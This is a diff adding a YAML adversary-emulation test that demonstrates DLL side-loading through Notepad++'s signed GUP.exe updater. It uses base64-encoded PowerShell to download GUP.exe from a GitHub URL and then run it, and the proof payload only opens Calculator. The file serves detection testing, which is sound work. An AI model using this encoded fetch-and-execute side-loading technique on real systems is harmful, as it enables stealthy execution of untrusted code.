@@ -1,0 +1,22 @@
+- id: 802fd0b8-8ca3-5d55-ab7c-41c2c3f1904d
+  name: Soumaia ART Tests - DLL Side-Loading using the Notepad++ GUP.exe binary
+  description: 'GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.
+
+    Upon execution, calc.exe will be opened.'
+  tactic: stealth
+  technique:
+    attack_id: T1574.001
+    name: 'Hijack Execution Flow: DLL'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEcAVQBQAC4AZQB4AGUAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABHAFUAUAAuAGUAeABlACIAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAaQBnAG4AbwByAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AYgBsAG8AYgAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQA1ADcANAAuADAAMAAxAC8AYgBpAG4ALwBHAFUAUAAuAGUAeABlAD8AcgBhAHcAPQB0AHIAdQBlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABHAFUAUAAuAGUAeABlACIACgA=
+          )
+          ".\GUP.exe"
+        cleanup: |-
+          taskkill /F /IM calculator.exe >nul 2>&1
+        payloads:
+        - GUP.exe
